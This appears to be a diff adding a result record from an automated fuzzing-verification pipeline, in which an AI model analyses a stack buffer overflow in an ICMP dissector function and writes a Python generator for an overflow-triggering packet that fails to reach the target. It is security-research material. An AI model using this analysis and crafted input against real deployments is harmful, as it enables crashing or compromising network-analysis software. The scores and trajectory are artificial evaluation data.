@@ -1,0 +1,188 @@
+{
+  "tag": "ws-delta-02__vuln_004",
+  "gt": "dissect_interface_identification_object",
+  "crash_type": "stack-buffer-overflow",
+  "tools_used": [
+    "check_reachability",
+    "read_function",
+    "reach_probe",
+    "submit_evidence"
+  ],
+  "evidence": {
+    "sanitizer_compatible": true,
+    "input_reaches_operand": true,
+    "guard_clamps": "none",
+    "pattern_present": true,
+    "reasoning": "Source shows a fixed-size stack buffer `uint8_t ident_name[ICMP_MAX_IDENT_NAME_LENGTH];` and in c_type==ICMP_EXT_ECHO_IDENT_NAME it does `tvb_memcpy(tvb, ident_name, offset, obj_length - 4);` with length derived from 16-bit `obj_length` read from packet at `offset`. There is no check that `obj_length-4 <= ICMP_MAX_IDENT_NAME_LENGTH` nor that `obj_length >= 4` (underflow possible). Only a generic `tvb_reported_length_remaining(tvb, offset) < 5` early return exists, which does not bound `obj_length`. Thus if this case is reached with a large obj_length, it will overflow the stack buffer (ASan-detectable). A reach_probe attempt with a guessed ICMP extension/object framing did not reach the function, so crash not yet demonstrated in this harness; however the overflow pattern is present and unguarded in the function itself.",
+    "corrected_description": "Stack-based buffer overflow in `dissect_interface_identification_object` when parsing ICMP Interface Identification Object with C-Type=NAME: `tvb_memcpy` copies `obj_length-4` bytes into fixed stack array `ident_name[ICMP_MAX_IDENT_NAME_LENGTH]` without validating `obj_length` against the buffer size (and without ensuring obj_length>=4).",
+    "control_flow_to_bug": "Fuzzer entry `handler_icmp` -> ICMP dissector parses ICMP extensions -> extension object dispatch selects Interface Identification Object -> `dissect_interface_identification_object(tvb, offset, ...)` -> reads `obj_length=tvb_get_ntohs(tvb, offset)` and `c_type=tvb_get_uint8(tvb, offset+3)` -> switch(c_type) takes `ICMP_EXT_ECHO_IDENT_NAME` -> executes `tvb_memcpy(..., ident_name, offset+4, obj_length-4)` with attacker-controlled obj_length, overflowing `ident_name` if obj_length-4 > ICMP_MAX_IDENT_NAME_LENGTH."
+  },
+  "dynamic": {
+    "any_reach": false,
+    "any_crash": false,
+    "probes": [
+      {
+        "target": "dissect_interface_identification_object",
+        "hit": false,
+        "crashed": false,
+        "asan_type": null
+      }
+    ]
+  },
+  "score": 0.65,
+  "verdict": "LIKELY",
+  "basis": "unclamped tainted (no dynamic margin)",
+  "trajectory": [
+    {
+      "iter": 0,
+      "tool": "check_reachability",
+      "args": {
+        "function_name": "dissect_interface_identification_object"
+      },
+      "result": "{\"reachable\": true, \"call_depth\": 5, \"reached_via\": \"observed\", \"n_callers\": 1}"
+    },
+    {
+      "iter": 0,
+      "tool": "read_function",
+      "args": {
+        "name": "dissect_interface_identification_object"
+      },
+      "result": "dissect_interface_identification_object(tvbuff_t * tvb, int offset,\n\t\t\t\t     proto_tree * ext_object_tree,\n\t\t\t\t     proto_item * tf_object)\n{\n\tproto_item *ti;\n\tuint16_t obj_length;\n\tuint8_t c_type;\n\tuint8_t ident_name[ICMP_MAX_IDENT_NAME_LENGTH];\n\tbool unknown_object;\n\tuint32_t afi;\n\tuint32_t addr_length;\n\n\tunknown_object = false;\n\t                   \n\tobj_length = tvb_get_ntohs(tvb, offset);\n\n\t            \n\tc_type = tvb_get_uint8(tvb, offset + 3);\n\n\tproto_item_set_text(tf_object, \"Interface Identification Object\");\n\tif (tvb_reported_length_remaining(tvb, offset) < 5) {\n\t\t                                                                  \n\t\treturn true;\n\t}\n\n\tti = proto_tree_add_uint(ext_object_tree, hf_icmp_ext_c_type, tvb, offset + 3, 1, c_type);\n\tproto_item_append_text(ti, \" (%s)\", val_to_str(c_type, ext_echo_ident_str, \"Unknown C-Type %u\"));\n\toffset += 4;\n\n\tswitch(c_type) {\n\t\tcase ICMP_EXT_ECHO_IDENT_NAME:\n\t\t\t                                          \n\t\t\ttvb_memcpy(tvb, ident_name, offset, obj_length - 4);\n\n\t\t\tfor (unsigned i = 0; i < obj_length - 4; i++)\n\t\t\t\tif (!g_ascii_isprint(ident_name[i]))\n\t\t\t\t\tbreak;\n\n\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_name_string, tvb, offset, obj_length - 4, ENC_ASCII);\n\t\t\tbreak;\n\t\tcase ICMP_EXT_ECHO_IDENT_INDEX:\n\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_index, tvb, offset, 4, ENC_NA);\n\t\t\tbreak;\n\t\tcase ICMP_EXT_ECHO_IDENT_ADDRESS:\n\t\t\tproto_tree_add_item_ret_uint(ext_object_tree, hf_icmp_int_ident_afi, tvb, offset, 2, ENC_BIG_ENDIAN, &afi);\n\t\t\toffset += 2;\n\t\t\tproto_tree_add_item_ret_uint(ext_object_tree, hf_icmp_int_ident_addr_length, tvb, offset, 1, ENC_BIG_ENDIAN, &addr_length);\n\t\t\toffset += 1;\n\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_reserved, tvb, offset, 1, ENC_NA);\n\t\t\toffset += 1;\n\t\t\tswitch(afi){\n\t\t\t\tcase AFNUM_INET:           \n\t\t\t\t\twhile(addr_length >= 4 && tvb_reported_length_remaining(tvb, offset) >= 4) {\n\t\t\t\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_ipv4, tvb, offset, 4, ENC_BIG_ENDIAN);\n\t\t\t\t\t\toffset += 4;\n\t\t\t\t\t\taddr_length -= 4;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase AFNUM_INET6:           \n\t\t\t\t\twhile(addr_length >= 16 && tvb_reported_length_remaining(tvb, offset) >= 16) {\n\t\t\t\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_ipv6, tvb, offset, 16, ENC_NA);\n\t\t\t\t\t\toffset += 16;\n\t\t\t\t\t\taddr_length -= 16;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:                 \n\t\t\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_address, tvb, offset, tvb_reported_length_remaining(tvb, offset), ENC_NA);\n\t\t\t}\n\t}\n\n\treturn unknown_object;\n\n}"
+    },
+    {
+      "iter": 1,
+      "tool": "reach_probe",
+      "args": {
+        "generator_code": "def generate()->bytes:\n    # Minimal ICMP packet with extension object crafted to overflow ident_name.\n    # We rely on dissector parsing ICMP extensions; exact framing may vary.\n    # Construct: ICMP Echo (type 8) + extension structure with Interface Identification object.\n    import struct\n    \n    # ICMP header: type=8, code=0, checksum=0, id=0, seq=0\n    icmp = struct.pack('!BBHHH', 8, 0, 0, 0, 0)\n    payload = b'A'*8\n\n    # ICMP extension header (RFC 4884): version=2 (0x20), reserved=0, checksum=0\n    ext_hdr = bytes([0x20,0x00,0x00,0x00])\n\n    # Object header: length (2 bytes), class-num (1), c-type (1)\n    # Choose class for Interface Identification? In Wireshark ICMP ext echo ident object class maybe 3? unknown.\n    # We'll brute by setting class=3 and c-type=1 (NAME)\n    obj_len = 4 + 300  # big to overflow  ident_name[ICMP_MAX_IDENT_NAME_LENGTH]\n    obj_hdr = struct.pack('!HBB', obj_len, 3, 1)\n    obj_data = b'B'*300\n\n    return icmp + payload + ext_hdr + obj_hdr + obj_data\n",
+        "target": "dissect_interface_identification_object"
+      },
+      "result": "{\"reached\": false, \"crashed\": false, \"asan_type\": null}"
+    },
+    {
+      "iter": 2,
+      "tool": "submit_evidence",
+      "args": {
+        "sanitizer_compatible": true,
+        "input_reaches_operand": true,
+        "guard_clamps": "none",
+        "pattern_present": true,
+        "reasoning": "Source shows a fixed-size stack buffer `uint8_t ident_name[ICMP_MAX_IDENT_NAME_LENGTH];` and in c_type==ICMP_EXT_ECHO_IDENT_NAME it does `tvb_memcpy(tvb, ident_name, offset, obj_length - 4);` with length derived from 16-bit `obj_length` read from packet at `offset`. There is no check that `obj_length-4 <= ICMP_MAX_IDENT_NAME_LENGTH` nor that `obj_length >= 4` (underflow possible). Only a generic `tvb_reported_length_remaining(tvb, offset) < 5` early return exists, which does not bound `obj_length`. Thus if this case is reached with a large obj_length, it will overflow the stack buffer (ASan-detectable). A reach_probe attempt with a guessed ICMP extension/object framing did not reach the function, so crash not yet demonstrated in this harness; however the overflow pattern is present and unguarded in the function itself.",
+        "corrected_description": "Stack-based buffer overflow in `dissect_interface_identification_object` when parsing ICMP Interface Identification Object with C-Type=NAME: `tvb_memcpy` copies `obj_length-4` bytes into fixed stack array `ident_name[ICMP_MAX_IDENT_NAME_LENGTH]` without validating `obj_length` against the buffer size (and without ensuring obj_length>=4).",
+        "control_flow_to_bug": "Fuzzer entry `handler_icmp` -> ICMP dissector parses ICMP extensions -> extension object dispatch selects Interface Identification Object -> `dissect_interface_identification_object(tvb, offset, ...)` -> reads `obj_length=tvb_get_ntohs(tvb, offset)` and `c_type=tvb_get_uint8(tvb, offset+3)` -> switch(c_type) takes `ICMP_EXT_ECHO_IDENT_NAME` -> executes `tvb_memcpy(..., ident_name, offset+4, obj_length-4)` with attacker-controlled obj_length, overflowing `ident_name` if obj_length-4 > ICMP_MAX_IDENT_NAME_LENGTH."
+      },
+      "result": "{\"received\": true}"
+    }
+  ],
+  "token_log": [
+    {
+      "iter": 0,
+      "model": "gpt-5.2",
+      "input_tokens": 909,
+      "output_tokens": 60,
+      "total_tokens": 969,
+      "latency_ms": 2079
+    },
+    {
+      "iter": 1,
+      "model": "gpt-5.2",
+      "input_tokens": 1946,
+      "output_tokens": 350,
+      "total_tokens": 2296,
+      "latency_ms": 5241
+    },
+    {
+      "iter": 2,
+      "model": "gpt-5.2",
+      "input_tokens": 2325,
+      "output_tokens": 467,
+      "total_tokens": 2792,
+      "latency_ms": 6434
+    }
+  ],
+  "token_totals": {
+    "input": 5180,
+    "output": 877,
+    "total": 6057,
+    "llm_calls": 3
+  },
+  "full_messages": [
+    {
+      "role": "system",
+      "content": "You are a vulnerability verifier. All candidate functions are already\nreachable from the fuzzer — do NOT re-litigate reachability as pass/fail. Your job\nis to gather EVIDENCE about whether the reached code actually contains a\ncrashing memory-safety bug of the stated type, then submit it.\n\nGather evidence with the tools:\n- read_function(name): read the real source.\n- check_reachability(function_name): confirm the call graph (depth, direct/indirect).\n- reach_probe(generator_code, target): write Python `def generate()->bytes` that\n  produces an input aiming to REACH `target` (a function name or \"file.c:LINE\").\n  It runs the input on the real ASan binary under gdb and tells you whether the\n  target was reached and whether it crashed. A crash is proof; a reach grounds\n  your judgment. Only a real crash or reach can raise the score above the ceiling —\n  you cannot assert a high score from reading alone.\n- submit_evidence(...): report your structured findings (see its schema). Call it\n  once, last.\n\nTwo of the fields are NOT about scoring — they correct the SP for the downstream\nPoV stage, and you are the right one to write them because you just read the real\ncode (and maybe ran a reach_probe):\n- corrected_description: if the SP's stated bug type/description is wrong or\n  imprecise given the real code, write the accurate one (else restate it).\n- control_flow_to_bug: the real path from the fuzzer entry to the crash site — the\n  key functions, branches, and conditions that must hold to trigger it.\n\nDo NOT pass things \"when in doubt\". Report what the evidence shows. Absence of a\ncrash is not proof of safety; a proven clamp/guard on the tainted value IS\ndisconfirming."
+    },
+    {
+      "role": "user",
+      "content": "Verify this suspicious point.\n\nFuzzer: handler_icmp   Sanitizer: address\nFunction: dissect_interface_identification_object\nClaimed bug type: stack-buffer-overflow\nThe function is reachable (confirm with check_reachability if useful).\n\nRead the function, judge whether a fuzzer input can drive a stack-buffer-overflow\nthere, optionally reach_probe a candidate input to ground it, then submit_evidence."
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_fGHHGdJrCUfXYY3evzrcndgk",
+          "type": "function",
+          "function": {
+            "name": "check_reachability",
+            "arguments": "{\"function_name\": \"dissect_interface_identification_object\"}"
+          }
+        },
+        {
+          "id": "call_jvYnm05CRr3WSsgaVC6mWmx2",
+          "type": "function",
+          "function": {
+            "name": "read_function",
+            "arguments": "{\"name\": \"dissect_interface_identification_object\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_fGHHGdJrCUfXYY3evzrcndgk",
+      "content": "{\"reachable\": true, \"call_depth\": 5, \"reached_via\": \"observed\", \"n_callers\": 1}"
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_jvYnm05CRr3WSsgaVC6mWmx2",
+      "content": "dissect_interface_identification_object(tvbuff_t * tvb, int offset,\n\t\t\t\t     proto_tree * ext_object_tree,\n\t\t\t\t     proto_item * tf_object)\n{\n\tproto_item *ti;\n\tuint16_t obj_length;\n\tuint8_t c_type;\n\tuint8_t ident_name[ICMP_MAX_IDENT_NAME_LENGTH];\n\tbool unknown_object;\n\tuint32_t afi;\n\tuint32_t addr_length;\n\n\tunknown_object = false;\n\t                   \n\tobj_length = tvb_get_ntohs(tvb, offset);\n\n\t            \n\tc_type = tvb_get_uint8(tvb, offset + 3);\n\n\tproto_item_set_text(tf_object, \"Interface Identification Object\");\n\tif (tvb_reported_length_remaining(tvb, offset) < 5) {\n\t\t                                                                  \n\t\treturn true;\n\t}\n\n\tti = proto_tree_add_uint(ext_object_tree, hf_icmp_ext_c_type, tvb, offset + 3, 1, c_type);\n\tproto_item_append_text(ti, \" (%s)\", val_to_str(c_type, ext_echo_ident_str, \"Unknown C-Type %u\"));\n\toffset += 4;\n\n\tswitch(c_type) {\n\t\tcase ICMP_EXT_ECHO_IDENT_NAME:\n\t\t\t                                          \n\t\t\ttvb_memcpy(tvb, ident_name, offset, obj_length - 4);\n\n\t\t\tfor (unsigned i = 0; i < obj_length - 4; i++)\n\t\t\t\tif (!g_ascii_isprint(ident_name[i]))\n\t\t\t\t\tbreak;\n\n\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_name_string, tvb, offset, obj_length - 4, ENC_ASCII);\n\t\t\tbreak;\n\t\tcase ICMP_EXT_ECHO_IDENT_INDEX:\n\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_index, tvb, offset, 4, ENC_NA);\n\t\t\tbreak;\n\t\tcase ICMP_EXT_ECHO_IDENT_ADDRESS:\n\t\t\tproto_tree_add_item_ret_uint(ext_object_tree, hf_icmp_int_ident_afi, tvb, offset, 2, ENC_BIG_ENDIAN, &afi);\n\t\t\toffset += 2;\n\t\t\tproto_tree_add_item_ret_uint(ext_object_tree, hf_icmp_int_ident_addr_length, tvb, offset, 1, ENC_BIG_ENDIAN, &addr_length);\n\t\t\toffset += 1;\n\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_reserved, tvb, offset, 1, ENC_NA);\n\t\t\toffset += 1;\n\t\t\tswitch(afi){\n\t\t\t\tcase AFNUM_INET:           \n\t\t\t\t\twhile(addr_length >= 4 && tvb_reported_length_remaining(tvb, offset) >= 4) {\n\t\t\t\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_ipv4, tvb, offset, 4, ENC_BIG_ENDIAN);\n\t\t\t\t\t\toffset += 4;\n\t\t\t\t\t\taddr_length -= 4;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase AFNUM_INET6:           \n\t\t\t\t\twhile(addr_length >= 16 && tvb_reported_length_remaining(tvb, offset) >= 16) {\n\t\t\t\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_ipv6, tvb, offset, 16, ENC_NA);\n\t\t\t\t\t\toffset += 16;\n\t\t\t\t\t\taddr_length -= 16;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:                 \n\t\t\t\t\tproto_tree_add_item(ext_object_tree, hf_icmp_int_ident_address, tvb, offset, tvb_reported_length_remaining(tvb, offset), ENC_NA);\n\t\t\t}\n\t}\n\n\treturn unknown_object;\n\n}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_oziu6ggILErCJZnJll1UQblj",
+          "type": "function",
+          "function": {
+            "name": "reach_probe",
+            "arguments": "{\"generator_code\":\"def generate()->bytes:\\n    # Minimal ICMP packet with extension object crafted to overflow ident_name.\\n    # We rely on dissector parsing ICMP extensions; exact framing may vary.\\n    # Construct: ICMP Echo (type 8) + extension structure with Interface Identification object.\\n    import struct\\n    \\n    # ICMP header: type=8, code=0, checksum=0, id=0, seq=0\\n    icmp = struct.pack('!BBHHH', 8, 0, 0, 0, 0)\\n    payload = b'A'*8\\n\\n    # ICMP extension header (RFC 4884): version=2 (0x20), reserved=0, checksum=0\\n    ext_hdr = bytes([0x20,0x00,0x00,0x00])\\n\\n    # Object header: length (2 bytes), class-num (1), c-type (1)\\n    # Choose class for Interface Identification? In Wireshark ICMP ext echo ident object class maybe 3? unknown.\\n    # We'll brute by setting class=3 and c-type=1 (NAME)\\n    obj_len = 4 + 300  # big to overflow  ident_name[ICMP_MAX_IDENT_NAME_LENGTH]\\n    obj_hdr = struct.pack('!HBB', obj_len, 3, 1)\\n    obj_data = b'B'*300\\n\\n    return icmp + payload + ext_hdr + obj_hdr + obj_data\\n\",\"target\":\"dissect_interface_identification_object\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_oziu6ggILErCJZnJll1UQblj",
+      "content": "{\"reached\": false, \"crashed\": false, \"asan_type\": null}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_iJcOzt1vWzJQTkPM63xUTkGG",
+          "type": "function",
+          "function": {
+            "name": "submit_evidence",
+            "arguments": "{\"sanitizer_compatible\":true,\"input_reaches_operand\":true,\"guard_clamps\":\"none\",\"pattern_present\":true,\"reasoning\":\"Source shows a fixed-size stack buffer `uint8_t ident_name[ICMP_MAX_IDENT_NAME_LENGTH];` and in c_type==ICMP_EXT_ECHO_IDENT_NAME it does `tvb_memcpy(tvb, ident_name, offset, obj_length - 4);` with length derived from 16-bit `obj_length` read from packet at `offset`. There is no check that `obj_length-4 <= ICMP_MAX_IDENT_NAME_LENGTH` nor that `obj_length >= 4` (underflow possible). Only a generic `tvb_reported_length_remaining(tvb, offset) < 5` early return exists, which does not bound `obj_length`. Thus if this case is reached with a large obj_length, it will overflow the stack buffer (ASan-detectable). A reach_probe attempt with a guessed ICMP extension/object framing did not reach the function, so crash not yet demonstrated in this harness; however the overflow pattern is present and unguarded in the function itself.\",\"corrected_description\":\"Stack-based buffer overflow in `dissect_interface_identification_object` when parsing ICMP Interface Identification Object with C-Type=NAME: `tvb_memcpy` copies `obj_length-4` bytes into fixed stack array `ident_name[ICMP_MAX_IDENT_NAME_LENGTH]` without validating `obj_length` against the buffer size (and without ensuring obj_length>=4).\",\"control_flow_to_bug\":\"Fuzzer entry `handler_icmp` -> ICMP dissector parses ICMP extensions -> extension object dispatch selects Interface Identification Object -> `dissect_interface_identification_object(tvb, offset, ...)` -> reads `obj_length=tvb_get_ntohs(tvb, offset)` and `c_type=tvb_get_uint8(tvb, offset+3)` -> switch(c_type) takes `ICMP_EXT_ECHO_IDENT_NAME` -> executes `tvb_memcpy(..., ident_name, offset+4, obj_length-4)` with attacker-controlled obj_length, overflowing `ident_name` if obj_length-4 > ICMP_MAX_IDENT_NAME_LENGTH.\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_iJcOzt1vWzJQTkPM63xUTkGG",
+      "content": "{\"received\": true}"
+    }
+  ]
+}
